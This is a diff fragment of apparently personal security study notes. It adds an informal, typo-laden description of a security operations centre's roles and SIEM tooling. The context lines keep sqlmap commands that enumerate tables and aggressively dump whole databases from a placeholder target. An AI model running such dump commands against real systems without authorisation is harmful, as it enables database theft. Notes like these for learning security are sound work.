@@ -370,4 +370,9 @@
   sqlmap -u "http://target.com" --batch -D databsename --tables  // this will give all the tables in te found database 
   sqlmap -u "http://target.com" --random-agent --forms --level=5 --risk=3 --dump --batch  // this is the aggressive prompt that will dumo everything 
   ```
-  
+- SOC security operations centre is a department which monitors and safeguards the entire organizatgion against malacious activities and attacks
+  their main job is do monitor detect respond contain eradicate and gain knowledge and prevent future mishaps and apart from incident response
+  they also do forensics as well they consist of soc analyst l1 soc analyst l2 soc analyst l3 security engineer detectgion engineer and above them
+  is the soc manager and then the ciso when ever the soc team is triaging alerts they answer these 5 question who what when where why the technology
+  that is used in soc is siem security information and event management which is a tool that centralizes logs of different devices on the
+  organization network into a single interface 
